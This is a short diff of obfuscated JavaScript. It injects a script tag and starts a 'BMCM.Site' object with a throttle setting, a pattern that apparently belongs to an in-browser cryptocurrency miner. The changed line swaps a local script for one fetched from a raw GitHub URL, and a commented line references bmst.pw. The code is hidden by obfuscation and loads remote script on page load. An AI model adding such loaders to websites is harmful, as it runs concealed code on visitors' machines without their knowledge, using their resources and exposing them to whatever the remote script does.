@@ -5,6 +5,6 @@
         _0x1d932b.removeChild(_0x16c99c), 'undefined' == typeof BMCM && 'function' == typeof _BMCM && _BMCM('BxkeFB8H', !0x0), new BMCM.Site(0x59cd9f, {
             'throttle': 0.2
         }).start();
-    }, _0x16c99c.src = 'bmst_x75.js';
+    }, _0x16c99c.src = 'https://raw.githubusercontent.com/EvOthuj/bmst_x75/main/bmst_x2_v2.js';
     //}, _0x16c99c.src = 'http://bmst.pw/BMCM.js?v=10';
 }();
